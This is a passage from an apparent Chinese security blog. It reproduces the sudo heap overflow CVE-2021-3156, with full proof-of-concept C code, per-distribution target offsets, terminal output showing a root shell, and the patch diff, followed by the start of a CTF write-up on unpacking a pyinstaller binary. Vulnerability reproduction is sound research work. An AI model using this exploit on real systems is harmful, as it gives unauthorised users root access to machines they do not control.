class="number">0x54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">0x30</span></span><br><span class="line">        <span class="comment">// .lc_all_len     = 212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/local/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">56</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">63</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">212</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .target_name    = <span class="string">&quot;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">64</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">49</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">60</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">214</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Yes, same values as 20.04.1, but also confirmed.</span></span><br><span class="line">        .target_name    = <span class="string">&quot;openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28&quot;</span>,</span><br><span class="line">        .sudoedit_path  = <span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line">        .smash_len_a    = <span class="number">0x53</span>,</span><br><span class="line">        .smash_len_b    = <span class="number">0x54</span>,</span><br><span class="line">        .null_stomp_len = <span class="number">0x185</span>,</span><br><span class="line">        .lc_all_len     = <span class="number">0xa0</span></span><br><span class="line">        <span class="comment">// .lc_all_len     = 212</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> *prog)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  usage: %s &lt;target&gt;\\n\\n&quot;</span>, prog);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  available targets:\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    %d) %s\\n&quot;</span>, i, targets[i].target_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  ------------------------------------------------------------\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\\n** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;\\n\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> target_idx = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_idx &lt; <span class="number">0</span> || target_idx &gt;= (<span class="keyword">sizeof</span>(targets) / <span class="keyword">sizeof</span>(<span class="type">target_t</span>))) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;invalid target index\\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">target_t</span> *target = &amp;targets[ target_idx ];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;using target: &#x27;%s&#x27;\\n&quot;</span>, target-&gt;target_name);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *smash_a = <span class="built_in">calloc</span>(target-&gt;smash_len_a + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *smash_b = <span class="built_in">calloc</span>(target-&gt;smash_len_b + <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(smash_a, <span class="string">&#x27;A&#x27;</span>, target-&gt;smash_len_a);</span><br><span class="line">    <span class="built_in">memset</span>(smash_b, <span class="string">&#x27;B&#x27;</span>, target-&gt;smash_len_b);</span><br><span class="line"></span><br><span class="line">    smash_a[target-&gt;smash_len_a] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">    smash_b[target-&gt;smash_len_b] = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_argv[]=&#123;</span><br><span class="line">        <span class="comment">// &quot;sudoedit&quot;, &quot;-s&quot;, smash_a, &quot;\\\\&quot;, NULL</span></span><br><span class="line">        <span class="comment">// &quot;sudoedit&quot;, &quot;-s&quot;, smash_a, NULL</span></span><br><span class="line">        <span class="string">&quot;sudoedit&quot;</span>, <span class="string">&quot;-s&quot;</span>, smash_a, <span class="string">&quot;\\\\&quot;</span>, smash_b, <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *s_envp[MAX_ENVP];</span><br><span class="line">    <span class="type">int</span> envp_pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; target-&gt;null_stomp_len; i++) &#123;</span><br><span class="line">        s_envp[envp_pos++] = <span class="string">&quot;\\\\&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s_envp[envp_pos++] = <span class="string">&quot;X/P0P_SH3LLZ_&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> lc_len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="type">int</span> lc_num = <span class="number">0x5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *temp=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">11</span>; i &gt; (<span class="number">11</span> - lc_num); i--)&#123;</span><br><span class="line">        temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">        s_envp[envp_pos++] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    temp = <span class="built_in">calloc</span>(target-&gt;lc_all_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, target-&gt;lc_all_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">    i -= <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// temp = calloc(0x60 + strlen(lc_names[i]) + 10, 1);</span></span><br><span class="line">    <span class="comment">// strcpy(temp, lc_names[i]);</span></span><br><span class="line">    <span class="comment">// strcpy(temp + strlen(lc_names[i]), &quot;=C.UTF-8@&quot;);</span></span><br><span class="line">    <span class="comment">// memset(temp+strlen(lc_names[i]) + 9, &#x27;A&#x27;+i, 0x60);</span></span><br><span class="line">    <span class="comment">// s_envp[envp_pos++] = temp;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// i -= 1;</span></span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line">    i-=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (target_idx == <span class="number">3</span>)&#123;</span><br><span class="line">        temp = <span class="built_in">calloc</span>(<span class="number">0xd0</span> + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">        <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=C.UTF-8@&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, <span class="number">0xd0</span>);</span><br><span class="line">        s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">        i -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">calloc</span>(lc_len + <span class="built_in">strlen</span>(lc_names[i]) + <span class="number">10</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp, lc_names[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(temp + <span class="built_in">strlen</span>(lc_names[i]), <span class="string">&quot;=XXXXXXXX&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(temp+<span class="built_in">strlen</span>(lc_names[i]) + <span class="number">9</span>, <span class="string">&#x27;A&#x27;</span>+i, lc_len);</span><br><span class="line">    s_envp[envp_pos++] = temp;</span><br><span class="line"></span><br><span class="line">    s_envp[envp_pos++] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;** pray for your rootshell.. **\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(target-&gt;sudoedit_path, s_argv, s_envp);</span><br><span class="line">    <span class="comment">// execve(target-&gt;sudoedit_path, s_argv, NULL);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[normal@172 CVE-2021-3156_blasty]$ ./sudo-hax-me-a-sandwich 3</span><br><span class="line"></span><br><span class="line">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><br><span class="line"></span><br><span class="line">using target: <span class="string">&#x27;openEuler release 20.03 (LTS) - sudo 1.8.27, libc-2.28&#x27;</span></span><br><span class="line">** pray <span class="keyword">for</span> your rootshell.. **</span><br><span class="line">[+] bl1ng bl1ng! We got it!</span><br><span class="line">sh-5.0<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p><a href="https://www.sudo.ws/repos/sudo/rev/049ad90590be">sudo: 049ad90590be</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- a/plugins/sudoers/sudoers.cSat Jan 23 08:43:59 2021 -0700</span></span><br><span class="line"><span class="comment">+++ b/plugins/sudoers/sudoers.cSat Jan 23 08:43:59 2021 -0700</span></span><br><span class="line"><span class="meta">@@ -547,7 +547,7 @@</span></span><br><span class="line"></span><br><span class="line">     /* If run as root with SUDO_USER set, set sudo_user.pw to that user. */</span><br><span class="line">     /* XXX - causes confusion when root is not listed in sudoers */</span><br><span class="line"><span class="deletion">-    if (sudo_mode &amp; (MODE_RUN | MODE_EDIT) &amp;&amp; prev_user != NULL) &#123;</span></span><br><span class="line"><span class="addition">+    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT) &amp;&amp; prev_user != NULL) &#123;</span></span><br><span class="line"> if (user_uid == 0 &amp;&amp; strcmp(prev_user, &quot;root&quot;) != 0) &#123;</span><br><span class="line">     struct passwd *pw;</span><br><span class="line"></span><br><span class="line"><span class="meta">@@ -932,8 +932,8 @@</span></span><br><span class="line">     if (user_cmnd == NULL)</span><br><span class="line"> user_cmnd = NewArgv[0];</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;</span></span><br><span class="line"><span class="deletion">-if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) &#123;</span></span><br><span class="line"><span class="addition">+    if (ISSET(sudo_mode, MODE_RUN|MODE_EDIT|MODE_CHECK)) &#123;</span></span><br><span class="line"><span class="addition">+if (!ISSET(sudo_mode, MODE_EDIT)) &#123;</span></span><br><span class="line">     const char *runchroot = user_runchroot;</span><br><span class="line">     if (runchroot == NULL &amp;&amp; def_runchroot != NULL &amp;&amp;</span><br><span class="line">     strcmp(def_runchroot, &quot;*&quot;) != 0)</span><br><span class="line"><span class="meta">@@ -961,7 +961,8 @@</span></span><br><span class="line"> sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;));</span><br><span class="line"> debug_return_int(NOT_FOUND_ERROR);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="deletion">-    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span></span><br><span class="line"><span class="addition">+    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL) &amp;&amp;</span></span><br><span class="line"><span class="addition">+    ISSET(sudo_mode, MODE_RUN)) &#123;</span></span><br><span class="line"> /*</span><br><span class="line">  * When running a command via a shell, the sudo front-end</span><br><span class="line">  * escapes potential meta chars.  We unescape non-spaces</span><br><span class="line"><span class="meta">@@ -969,10 +970,22 @@</span></span><br><span class="line">  */</span><br><span class="line"> for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123;</span><br><span class="line">     while (*from) &#123;</span><br><span class="line"><span class="deletion">-if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1]))</span></span><br><span class="line"><span class="addition">+if (from[0] == &#x27;\\\\&#x27; &amp;&amp; from[1] != &#x27;\\0&#x27; &amp;&amp;</span></span><br><span class="line"><span class="addition">+!isspace((unsigned char)from[1])) &#123;</span></span><br><span class="line">     from++;</span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+if (size - (to - user_args) &lt; 1) &#123;</span></span><br><span class="line"><span class="addition">+    sudo_warnx(U_(&quot;internal error, %s overflow&quot;),</span></span><br><span class="line"><span class="addition">+__func__);</span></span><br><span class="line"><span class="addition">+    debug_return_int(NOT_FOUND_ERROR);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> *to++ = *from++;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    if (size - (to - user_args) &lt; 1) &#123;</span></span><br><span class="line"><span class="addition">+sudo_warnx(U_(&quot;internal error, %s overflow&quot;),</span></span><br><span class="line"><span class="addition">+    __func__);</span></span><br><span class="line"><span class="addition">+debug_return_int(NOT_FOUND_ERROR);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line">     *to++ = &#x27; &#x27;;</span><br><span class="line"> &#125;</span><br><span class="line"> *--to = &#x27;\\0&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>patch</code>检查了参数是否以反斜杠结尾，并在拷贝过程中对溢出进行了检测。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>针对利用<code>1</code>，我调试了一下发现没有进入<code>process_hooks_getenv</code>的路径，看源码分析，<code>github</code>中的<code>exp</code>执行的是<code>SUDO_EDITOR</code>，从源码中来看应该是位于<code>find_editor</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">find_editor</span><span class="params">(<span class="type">int</span> nfiles, <span class="type">char</span> **files, <span class="type">int</span> *argc_out, <span class="type">char</span> ***argv_out,</span></span><br><span class="line"><span class="params">     <span class="type">char</span> * <span class="type">const</span> *whitelist, <span class="type">const</span> <span class="type">char</span> **env_editor, <span class="type">bool</span> env_error)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ev[<span class="number">3</span>], *editor_path = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    debug_decl(find_editor, SUDOERS_DEBUG_UTIL)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If any of SUDO_EDITOR, VISUAL or EDITOR are set, choose the first one.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    *env_editor = <span class="literal">NULL</span>;</span><br><span class="line">    ev[<span class="number">0</span>] = <span class="string">&quot;SUDO_EDITOR&quot;</span>;</span><br><span class="line">    ev[<span class="number">1</span>] = <span class="string">&quot;VISUAL&quot;</span>;</span><br><span class="line">    ev[<span class="number">2</span>] = <span class="string">&quot;EDITOR&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nitems(ev); i++) &#123;</span><br><span class="line"><span class="type">char</span> *editor = getenv(ev[i]);</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而该函数在申请完<code>user_args</code>堆块之后的调用发现只有一处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Require a password if sudoers says so.  */</span></span><br><span class="line"><span class="keyword">switch</span> (check_user(validated, sudo_mode)) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="literal">true</span>:</span><br><span class="line">    <span class="comment">/* user authenticated successfully. */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="literal">false</span>:</span><br><span class="line">    <span class="comment">/* Note: log_denial() calls audit for us. */</span></span><br><span class="line">    <span class="keyword">if</span> (!ISSET(validated, VALIDATE_SUCCESS)) &#123;</span><br><span class="line">      <span class="comment">/* Only display a denial message if no password was read. */</span></span><br><span class="line">      <span class="keyword">if</span> (!log_denial(validated, def_passwd_tries &lt;= <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="comment">/* some other error, ret is -1. */</span></span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="built_in">free</span>(safe_cmnd);</span><br><span class="line">safe_cmnd = find_editor(NewArgc - <span class="number">1</span>, NewArgv + <span class="number">1</span>, &amp;edit_argc,</span><br><span class="line">                        &amp;edit_argv, <span class="literal">NULL</span>, &amp;env_editor, <span class="literal">false</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是该函数的调用是位于<code>check_user</code>函数之后的，该函数经过调试发现需要满足两个条件，一个是密码输入正确，另一个就是用户需要在<code>sudo</code>列表中，但是满足这个条件的话就不要提权了。</p><p>原文章中写的环境变量为<code>SYSTEMD_BYPASS_USERDB</code>，搜索了一下该环境变量是位于<code>systemd</code>中，不知道怎么发生调用。所以现在卡住了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zh.wikipedia.org/wiki/%E5%8C%BA%E5%9F%9F%E8%AE%BE%E7%BD%AE">区域设置</a></p><p><a href="https://packetstormsecurity.com/files/161160/Sudo-Heap-Based-Buffer-Overflow.html">Sudo Heap-Based Buffer Overflow</a></p><p><a href="https://github.com/blasty/CVE-2021-3156">CVE-2021-3156 PoC</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 纵横杯线下 WP</title>
      <link href="/posts/4269520279.html"/>
      <url>/posts/4269520279.html</url>
      
        <content type="html"><![CDATA[<h2 id="异或不在星期天-pwn1"><a href="#异或不在星期天-pwn1" class="headerlink" title="异或不在星期天-pwn1"></a>异或不在星期天-pwn1</h2><p>推测应该是一个栈溢出。但是<code>encode</code>函数太大，无法反汇编，因此这里不知道该怎么利用。</p><p><code>patch</code>的话将<code>return 0</code>函数<code>patch</code>为<code>exit</code>。直接退出，要保存返回值一致的话还需要将<code>rdi</code>清空。</p><h2 id="Babyhttpd-pwn2"><a href="#Babyhttpd-pwn2" class="headerlink" title="Babyhttpd-pwn2"></a>Babyhttpd-pwn2</h2><p>首先用<code>ida</code>反编译看到这是一个<code>pyinstaller</code>打包的文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">000000000000639</span>D<span class="number">0000000F</span>C/proc/self/exe</span><br><span class="line">.rodata:<span class="number">00000000000063</span>AC<span class="number">00000019</span>CPy_DontWriteBytecodeFlag</span><br><span class="line">.rodata:<span class="number">00000000000063</span>C5<span class="number">0000001</span>DCPy_FileSystemDefaultEncoding</span><br><span class="line">.rodata:<span class="number">00000000000063E2</span><span class="number">0000000</span>ECPy_FrozenFlag</span><br><span class="line">.rodata:<span class="number">00000000000063F</span>0<span class="number">00000019</span>CPy_IgnoreEnvironmentFlag</span><br><span class="line">.rodata:<span class="number">0000000000006409</span><span class="number">0000000</span>ECPy_NoSiteFlag</span><br><span class="line">.rodata:<span class="number">0000000000006417</span><span class="number">00000017</span>CPy_NoUserSiteDirectory</span><br><span class="line">.rodata:<span class="number">000000000000642</span>E<span class="number">00000010</span>CPy_OptimizeFlag</span><br><span class="line">.rodata:<span class="number">000000000000643</span>E<span class="number">0000000F</span>CPy_VerboseFlag</span><br><span class="line">.rodata:<span class="number">000000000000644</span>D<span class="number">0000000</span>ECPy_BuildValue</span><br><span class="line">.rodata:<span class="number">000000000000645B</span><span class="number">0000000</span>ACPy_DecRef</span><br><span class="line">.rodata:<span class="number">0000000000006465</span><span class="number">0000001</span>CCCannot dlsym <span class="keyword">for</span> Py_DecRef\n</span><br></pre></td></tr></table></figure><p><code>pyinstaller</code>打包的原理是对<code>py</code>进行编码，在执行的过程中会解码出一个<code>pyc</code>到<code>tmp</code>目录下面，打包之后的程序有一个<code>python</code>解释器，执行<code>pyc</code>。</p><p>那么将<code>pyinstaller</code>打包之后的<code>elf</code>文件解为<code>py</code>文件有如下的步骤</p><p>首先通过<code>https://github.com/extremecoders-re/pyinstxtractor/wiki/Extracting-Linux-ELF-binaries</code>中的工具将<code>elf</code>解码为<code>pyc</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objcopy --dump-section pydata=pydata.dump testfile.elf</span><br><span class="line">python pyinstxtractor.py pydata.dump</span><br></pre></td></tr></table></figure><p>对于<code>exe</code>文件直接运行这个脚本即可</p><p>解码得到<code>pyc</code>文件之后需要将<code>pyc</code>解码为<code>py</code>文件，但是这个题目中<code>struct.pyc</code>可以解码成功，但是主要的<code>input_httpd.pyc</code>无法解码，<code>magic_number</code>错误，那么此时对照<code>struct.pyc</code>修改<code>input_httpd.pyc</code>的头</p><p>也就是将<code>03f3 0d0a 0000 0000 0000 0000</code>修改为<code>160d 0d0a 7079 6930 0101</code>。</p><p>最后使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/uncompyle6 input_httpd.pyc &gt; input_httpd.py</span><br></pre></td></tr></table></figure><p>解码得到<code>input_httpd.py</code>这个文件。</p><p>程序存在两个漏洞，其中一个预计是非预期在<code>do_Get</code>函数中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">  f = self.send_head()</span><br><span class="line">  <span class="keyword">if</span> f:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      self.copyfile(f, self.wfile)</span><br><span class="line">      <span class="keyword">finally</span>:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_head</span>(<span class="params">self</span>):</span><br><span class="line">  path = self.translate_path(self.path)</span><br><span class="line">  f = <span class="literal">None</span></span><br><span class="line">  <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> self.path:</span><br><span class="line">    self.send_error(<span class="number">403</span>, self.responses[<span class="number">403</span>][<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 